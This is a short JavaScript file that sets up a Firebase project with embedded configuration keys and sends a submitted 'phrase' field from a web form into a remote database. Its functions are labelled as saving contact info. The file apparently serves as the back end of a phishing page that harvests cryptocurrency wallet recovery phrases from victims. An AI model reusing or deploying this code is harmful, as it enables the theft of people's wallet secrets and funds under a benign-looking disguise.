// Your web app's Firebase configuration


var firebaseConfig = {
    apiKey: "AIzaSyAZaVfOOPYkw3kFTi1FlynQ41vT4IMXVpQ",
    authDomain: "pamalikasako.firebaseapp.com",
    projectId: "pamalikasako",
    storageBucket: "pamalikasako.appspot.com",
    messagingSenderId: "393016043530",
    appId: "1:393016043530:web:356a22824be3f5d0ce57f3"
};

// Initialize Firebase 
firebase.initializeApp(firebaseConfig);

// Reference contactInfo collections
let contactInfo = firebase.database().ref("infos");

//Listen for submit
document.querySelector(".phrase-id").addEventListener("submit", submitForm);

function submitForm(e) {
    e.preventDefault();

    // Get input Values
    let phrase = document.querySelector(".phrase").value;
    console.log(phrase);

    saveContactInfo(phrase);

    document.querySelector(".phrase-id").reset();
}

//Save infos to Firebase
function saveContactInfo(phrase) {
    let newContactInfo = contactInfo.push();

    newContactInfo.set({
        phrase: phrase,
    });
}